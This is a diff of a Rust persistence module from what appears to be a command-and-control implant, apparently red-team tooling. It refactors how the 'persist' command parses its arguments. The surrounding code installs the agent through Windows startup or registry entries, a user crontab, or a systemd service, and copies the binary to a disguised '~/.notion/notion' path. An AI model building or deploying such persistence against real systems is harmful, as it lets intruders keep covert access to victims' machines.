@@ -1,7 +1,7 @@
 use std::error::Error;
 use std::env::{var, args};
 use is_root::is_root;
-use crate::cmd::{shell, save};
+use crate::cmd::{CommandArgs, shell, save};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
@@ -26,10 +26,10 @@ use crate::logger::Logger;
 /// 
 /// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
 /// * `systemd`: Creates a systemd service and writes the binary someplace special
-pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
+pub async fn handle(mut cmd_args: CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
     // `persist [method] [args]`
     #[cfg(windows)] {
-        match s.trim() {
+        match cmd_args.nth(0).unwrap().as_str() {
             "startup" => {
                 // Get user
                 if let Ok(v) = var("APPDATA") {
@@ -183,7 +183,7 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions, logger: &Log
         let app_dir = format!("{home}/.notion");
         let dest_path = format!("{app_dir}/notion");
 
-        match s.trim() {
+        match cmd_args.nth(0).unwrap_or_default().as_str() {
             "cron"    => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
